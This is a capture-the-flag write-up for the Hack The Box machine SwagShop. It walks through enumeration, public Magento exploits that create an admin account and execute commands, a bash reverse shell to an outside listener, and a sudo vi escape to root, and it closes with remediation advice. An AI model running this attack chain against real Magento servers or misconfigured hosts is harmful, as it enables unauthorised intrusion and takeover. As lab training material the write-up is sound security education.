+++
date = '2026-06-04T18:37:59-04:00'
title = 'Swagshop'
tags = ["htb", "easy"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/23477a54b0a750374e281656d69e7661.png)

https://www.hackthebox.com/machines/SwagShop
## OS: Linux Ubuntu
``` IP
10.129.229.138
```
## Credentials:

| Username | Password | Notes/Hash                                             |
| -------- | -------- | ------------------------------------------------------ |
| forme    | forme    | after running exploit to create an account on `/admin` |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Thu Jun  4 15:11:32 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/SwagShop 10.129.229.138
Nmap scan report for 10.129.229.138
Host is up, received reset ttl 63 (0.017s latency).
Scanned at 2026-06-04 15:11:33 EDT for 23s
Not shown: 65359 closed tcp ports (reset), 174 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgTCefp89MPJm2oaJqietdslSBur+eCMVQRW19iUL2DQSdZrIctssf/ws4HWN9DuXWB1p7OR9GWQhjeFv+xdb8OLy6EQ72zQOk+cNU9ANi72FZIkpD5A5vHUyhhUSUcnn6hwWMWW4dp6BFVxczAiutSWBVIm2YLmcqwOEOJhfXLVvsVqu8KUmybJQWFaJIeLVHzVgrF1623ekDXMwT7Ktq49RkmqGGE+e4pRy5pWlL2BPVcrSv9nMRDkJTXuoGQ53CRcp9VVi2V7flxTd6547oSPck1N+71Xj/x17sMBDNfwik/Wj3YLjHImAlHNZtSKVUT9Ifqwm973YRV9qtqtGT
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEG18M3bq7HSiI8XlKW9ptWiwOvrIlftuWzPEmynfU6LN26hP/qMJModcHS+idmLoRmZnC5Og9sj5THIf0ZtxPY=
|   256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINmmpsnVsVEZ9KB16eRdxpe75vnX8B/AZMmhrN2i4ES7
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
```
 
---
## Attack + Enum Vectors
- TCP 80: HTTP Apache 2.4.29
- TCP 22: SSH OpenSSH 7.6p1
### UDP (161 SNMP)?
- UDP 161: Closed

---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
going to
```
http://10.129.229.138
```
it redirected to `swagshop.htb`, so let's add that to our `/etc/hosts`
```
10.129.229.138 swagshop.htb
```

Viewing it on Firefox:
```
http://swagshop.htb/index.php
```
seems like it is a `php` server. Maybe we can look some where to inject `php` code?

On the top right of the web server: it showed `Magento`, and on the bottom of the page it says `© 2014 Magento Demo Store. All Rights Reserved.` We take note of these

Let's run gobuster:
```
gobuster dir -u http://swagshop.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -r -b 403,404
```
```
media                (Status: 200) [Size: 1917]
includes             (Status: 200) [Size: 946]
lib                  (Status: 200) [Size: 2877]
app                  (Status: 200) [Size: 1698]
shell                (Status: 200) [Size: 1547]
skin                 (Status: 200) [Size: 1331]
var                  (Status: 200) [Size: 2097]
errors               (Status: 200) [Size: 2149]
mage                 (Status: 200) [Size: 1319]
```

in `http://swagshop.htb/mage`: it showed it is `Magento Commerce`

Now lets's search for some public exploits: https://www.exploit-db.com/exploits/37977
this exploit is published on the 2015, given the tag was 2014, it could be usable.

changing the `target` in the exploit we run it with `python2`, appearantly not working?

Then I tried registering an account with `admin:admin123` and saw the url after log in:
```
http://swagshop.htb/index.php/customer/account/
```
seems like the usual directories are under `/index.php`

going into exploit we see it uses `/admin`, I'm guessing the URL is specified wrong when using the exploit; let's try fixing that to `http://swagshop.htb/index.php` as target
```
python2 37977.py
WORKED
Check http://swagshop.htb/index.php/admin with creds forme:forme
```
we then log in as `forme` on the `/admin` page

---
## Initial Foothold
Immediately after logging on `/admin` page we saw `Magento ver. 1.9.0.0` 

Searching that on exploit-db we found: https://www.exploit-db.com/exploits/37811 

Since now we have the credentials `forme:forme`; let's try leveraging the exploit to see if we can get a reverse shell; first we change the creds to `forme:forme` in script
```
python3 37811.py http://swagshop.htb/index.php 'id'
```
got error, seems like we should run it with `python2`
```
python2 37811.py http://swagshop.htb/index.php 'id'
```
```
ImportError: No module named mechanize
```
output: interesting we need a `mechanize` installed to execute the code

I tried setting up python virtual environment but I don't think that works with `python2`? I got lazy so I just googled for newer exploits: `Magento 1.9.0.0 exploit rce site:github.com`. We found:  https://github.com/Hackhoven/Magento-RCE/blob/main/magento-rce-exploit.py which seems like is runnable by `python3`. Also requires `mechanize`; 
```
git clone https://github.com/Hackhoven/Magento-RCE/blob/main/magento-rce-exploit.py
```
let's set up virtual environment
```
python3 -m venv venv
```
activate it: 
```
source venv/bin/activate
```
```
python3 -m pip install mechanize
```
alright we should be able to run code,  let's try
```
python3 magento-rce-exploit.py http://swagshop.htb/index.php 'id'
```
didn't work? hmmm maybe I have to change the target URL?
```
python3 magento-rce-exploit.py http://swagshop.htb/ 'id'
```
nope, didn't work too, how about on `/admin`?
```
python3 magento-rce-exploit.py http://swagshop.htb/index.php/admin 'id'
```
waiting for abit... Aha! We got:
```
Form name: None
Control name: form_key
Control name: login[username]
Control name: dummy
Control name: login[password]
Control name: None
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Perfect! Now let's try getting a shell with `bash -c` wrap: set up listener:
```
sudo nc -lvnp
```
call reverse shell:
```
python3 magento-rce-exploit.py http://swagshop.htb/index.php 'bash -c "bash -i >& /dev/tcp/10.10.15.101/1337 0>&1"'
```
and.. we got in! Let's upgrade our shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
then `Ctrl + Z` to back ground:
```
stty raw -echo;fg
```
```
reset
```
and add in my `tmux` rows and columns:
```
stty rows 48 cols 210
```
There we go, a fully functioning shell as `www-data`

---
## Priv Esc
```
sudo -l
```
Interesting enough, we can execute sudo as `www-data`
```
(root) NOPASSWD: /usr/bin/vi /var/www/html/*
```
hmmm I recognize the path already, let's reference [GTFOBins vi](https://gtfobins.org/gtfobins/vi/)

Let's first try to edit a file:
```
sudo /usr/bin/vi /var/www/html/test.txt
```
then when we are in `vi`:
```
:!/bin/bash
```
There we go we got root!

Therefore pwn'd

---
## Conclusion & Remediation
Overall was a smooth easy box, the privilege escalation part is very simple yet effective. Exploiting part took a little time to find altternative but also fair.

System administrators should upgrade `Magento` servers to the latest `Magento` version since `Magento` is still vulnerable in higher versions. In addition, `vi`/`vim` should not be able to executed as `root` permissions as that can lead to local privilege escalation to `root`. Users should be configured with least privileges principle and should not be able to modify files with `root` privileges any ways.